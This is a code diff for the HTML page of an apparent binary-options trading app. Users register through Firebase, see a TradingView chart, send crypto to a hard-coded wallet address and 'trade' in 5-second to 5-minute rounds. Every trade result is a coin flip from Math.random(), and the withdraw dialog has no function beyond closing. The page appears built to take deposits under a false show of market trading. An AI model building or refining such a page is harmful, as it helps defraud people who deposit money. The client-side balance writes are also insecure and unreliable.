@@ -19,12 +19,9 @@
         .timer-badge { position: absolute; bottom: 10px; right: 10px; background: #eab308; color: black; padding: 5px 15px; border-radius: 50px; font-weight: 800; display: none; z-index: 100; font-size: 12px; }
         .btn-grad-green { background: linear-gradient(135deg, #22c55e 0%, #15803d 100%); }
         .btn-grad-red { background: linear-gradient(135deg, #ef4444 0%, #b91c1c 100%); }
-        
         #loadingScreen { position: fixed; inset: 0; background: #05070a; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .loader-spin { width: 35px; height: 35px; border: 3px solid #1a1f29; border-top: 3px solid #eab308; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        select option { background: #1a1f29; color: white; }
-
         .success-checkmark { width: 60px; height: 60px; margin: 0 auto; border: 3px solid #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
     </style>
 </head>
@@ -60,6 +57,12 @@
             </div>
         </header>
 
+        <div class="mb-2">
+            <select id="assetSelect" onchange="loadChart(this.value)" class="w-full bg-white/5 border border-white/10 rounded-xl p-2 text-yellow-500 font-bold text-[11px] outline-none">
+                <option value="FX:EURUSD">EUR/USD</option><option value="BINANCE:BTCUSDT">BTC/USDT</option><option value="OANDA:XAUUSD">GOLD</option>
+            </select>
+        </div>
+
         <main class="relative flex-grow rounded-[24px] overflow-hidden bg-black mb-2 border border-white/5">
             <div id="tv_chart" class="h-full w-full"></div>
             <div id="tradeTimer" class="timer-badge">⏱ <span id="timerText">00:00</span></div>
@@ -67,14 +70,10 @@
 
         <footer class="glass-card p-3 rounded-[24px]">
             <div class="grid grid-cols-2 gap-3 mb-3">
+                <div class="bg-black/40 p-2 rounded-xl border border-white/5"><input id="tradeAmt" type="number" value="100" class="bg-transparent outline-none font-black text-white text-base w-full px-1"></div>
                 <div class="bg-black/40 p-2 rounded-xl border border-white/5">
-                    <span class="text-[8px] text-gray-500 font-bold uppercase block ml-1">Amount</span>
-                    <input id="tradeAmt" type="number" value="100" class="bg-transparent outline-none font-black text-white text-base w-full px-1">
-                </div>
-                <div class="bg-black/40 p-2 rounded-xl border border-white/5">
-                    <span class="text-[8px] text-gray-500 font-bold uppercase block ml-1">Time</span>
                     <select id="duration" class="bg-transparent font-black text-white text-base w-full outline-none">
-                        <option value="5">5s</option><option value="60">1m</option>
+                        <option value="5">5s</option><option value="60">1m</option><option value="300">5m</option>
                     </select>
                 </div>
             </div>
@@ -85,12 +84,6 @@
         </footer>
     </div>
 
-    <div id="settingsM" class="modal"><div class="glass-card p-8 rounded-[32px] w-full max-w-sm text-center">
-        <h2 id="modalEmail" class="text-white font-bold mb-4"></h2>
-        <button onclick="auth.signOut().then(()=>location.reload())" class="w-full py-3 bg-red-600/20 text-red-500 rounded-xl font-bold uppercase">Logout</button>
-    </div></div>
-    <div id="resultM" class="modal"><div id="resultBox" class="bg-[#1a1f2e] p-10 rounded-[40px] text-center border border-white/10 w-80"></div></div>
-
     <div id="depM" class="modal">
         <div class="glass-card p-8 rounded-[32px] w-full max-w-sm text-center">
             <div id="dStep1">
@@ -99,7 +92,7 @@
                 <button onclick="toDStep(2)" class="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl uppercase">Next</button>
             </div>
             <div id="dStep2" class="hidden">
-                <div class="bg-black/40 p-3 rounded-xl mb-4 text-[10px] break-all border border-white/10">TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM</div>
+                <div class="bg-black/40 p-3 rounded-xl mb-4 border border-white/10 text-[10px]">TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM</div>
                 <button onclick="toDStep(3)" class="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl uppercase">I Have Paid</button>
             </div>
             <div id="dStep3" class="hidden space-y-3">
@@ -113,6 +106,10 @@
         </div>
     </div>
 
+    <div id="settingsM" class="modal"><div class="glass-card p-8 rounded-[32px] w-full max-w-sm text-center"><h2 id="modalEmail" class="text-white mb-4"></h2><button onclick="auth.signOut().then(()=>location.reload())" class="w-full py-3 bg-red-600/10 text-red-500 rounded-xl font-bold uppercase">Logout</button></div></div>
+    <div id="witM" class="modal"><div class="glass-card p-8 rounded-[32px] w-full max-w-sm text-center"><h2>Withdraw</h2><input id="witAmt" type="number" placeholder="Amount" class="auth-input mt-4"><button onclick="hideM('witM')" class="mt-4">Close</button></div></div>
+    <div id="resultM" class="modal"><div id="resultBox" class="bg-[#1a1f2e] p-10 rounded-[40px] text-center border border-white/10 w-80"></div></div>
+
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
     <script>
         const firebaseConfig = { apiKey: "AIzaSyAySRA1YSpTpmC8WjnKmDhnNMHkEmkeP50", authDomain: "waqas-47f30.firebaseapp.com", projectId: "waqas-47f30", storageBucket: "waqas-47f30.appspot.com", messagingSenderId: "374104279093", appId: "1:374104279093:web:6e1844b60456c700940364" };
@@ -120,64 +117,48 @@
         const auth = firebase.auth(), db = firebase.firestore();
         let userData = null, mode = 'reg', chartLoaded = false;
 
-        // EMERGENCY LOADER REMOVAL (Fixes the "Verifying Session" stuck issue)
-        setTimeout(() => {
-            const loader = document.getElementById('loadingScreen');
-            if (loader && loader.style.display !== 'none') {
-                loader.style.display = 'none';
-                if (!auth.currentUser) {
-                    document.getElementById('authSection').style.display = 'flex';
-                }
-            }
-        }, 2000); // Forced hide after 2 seconds
+        // Force hide loader after 2.5s if network is slow
+        setTimeout(() => { if(document.getElementById('loadingScreen').style.display !== 'none') { document.getElementById('loadingScreen').style.display = 'none'; if(!auth.currentUser) showM('authSection'); } }, 2500);
 
         function showM(id) { document.getElementById(id).style.display = 'flex'; }
         function hideM(id) { document.getElementById(id).style.display = 'none'; }
         function toDStep(s) { document.getElementById('dStep1').classList.add('hidden'); document.getElementById('dStep2').classList.add('hidden'); document.getElementById('dStep3').classList.add('hidden'); document.getElementById('dStep'+s).classList.remove('hidden'); }
 
         auth.onAuthStateChanged(user => {
-            const loader = document.getElementById('loadingScreen');
             if(user) {
                 db.collection('users').doc(user.uid).onSnapshot(doc => {
                     userData = doc.data();
                     if(userData) {
                         document.getElementById('balanceDisp').innerText = "$" + (userData.balance || 0).toFixed(2);
-                        document.getElementById('modalEmail').innerText = user.email;
                         document.getElementById('depEmail').value = user.email;
+                        document.getElementById('modalEmail').innerText = user.email;
                         document.getElementById('userInitial').innerText = user.email[0].toUpperCase();
                         document.getElementById('authSection').style.display = 'none';
                         document.getElementById('appTerminal').style.display = 'flex';
-                        if(!chartLoaded) { new TradingView.widget({ "autosize": true, "symbol": "FX:EURUSD", "interval": "1", "theme": "dark", "container_id": "tv_chart", "hide_top_toolbar": true }); chartLoaded = true; }
-                        if (loader) loader.style.display = 'none';
+                        if(!chartLoaded) { loadChart('FX:EURUSD'); chartLoaded = true; }
+                        document.getElementById('loadingScreen').style.display = 'none';
                     }
                 });
-            } else { 
-                document.getElementById('authSection').style.display = 'flex'; 
-                if (loader) loader.style.display = 'none'; 
-            }
+            } else { showM('authSection'); document.getElementById('loadingScreen').style.display = 'none'; }
         });
-
-        async function handleAuth() {
-            const e = document.getElementById('userEmail').value, p = document.getElementById('userPass').value;
-            if(!e || !p) return;
-            try { 
-                if(mode==='reg') { 
-                    const r = await auth.createUserWithEmailAndPassword(e, p); 
-                    await db.collection('users').doc(r.user.uid).set({ email: e, balance: 0, tradeMode: 'normal' }); 
-                } else { await auth.signInWithEmailAndPassword(e, p); } 
-            } catch(err) { alert(err.message); }
-        }
 
         async function submitFinalDep() {
             const tx = document.getElementById('depTx').value, name = document.getElementById('depName').value, samt = document.getElementById('depSentAmt').value;
             if(!tx || !name || !samt) return alert("Fill all fields");
             await db.collection('requests').add({ uid: auth.currentUser.uid, email: auth.currentUser.email, txid: tx, accountName: name, sentAmount: samt, time: Date.now() });
-            hideM('depM'); 
+            hideM('depM');
             const box = document.getElementById('resultBox');
             box.innerHTML = `<div class="success-checkmark"><span class="text-green-500 text-3xl">✓</span></div><h2 class="text-green-500 font-black mt-4">SENT</h2><button onclick="hideM('resultM')" class="w-full bg-white/10 py-3 rounded-xl mt-6 uppercase font-bold text-sm">OK</button>`;
             showM('resultM');
         }
 
+        async function handleAuth() {
+            const e = document.getElementById('userEmail').value, p = document.getElementById('userPass').value;
+            if(mode==='reg') await auth.createUserWithEmailAndPassword(e, p).then(r => db.collection('users').doc(r.user.uid).set({email:e, balance:0}));
+            else await auth.signInWithEmailAndPassword(e, p);
+        }
+
+        function loadChart(s) { new TradingView.widget({"autosize": true, "symbol": s, "interval": "1", "theme": "dark", "container_id": "tv_chart", "hide_top_toolbar": true}); }
         function switchAuth(t) { mode = t; document.getElementById('authBtn').innerText = t==='login'?'Login':'Registration'; }
         
         async function initTrade(type) {
@@ -189,7 +170,9 @@
                 document.getElementById('tradeTimer').style.display = 'none';
                 const win = Math.random() > 0.5;
                 if(win) db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(amt*1.8) });
-                alert(win ? "WIN" : "LOSS");
+                const box = document.getElementById('resultBox');
+                box.innerHTML = `<h2>${win?'PROFIT':'LOSS'}</h2><button onclick="hideM('resultM')">OK</button>`;
+                showM('resultM');
             }, dur * 1000);
         }
     </script>
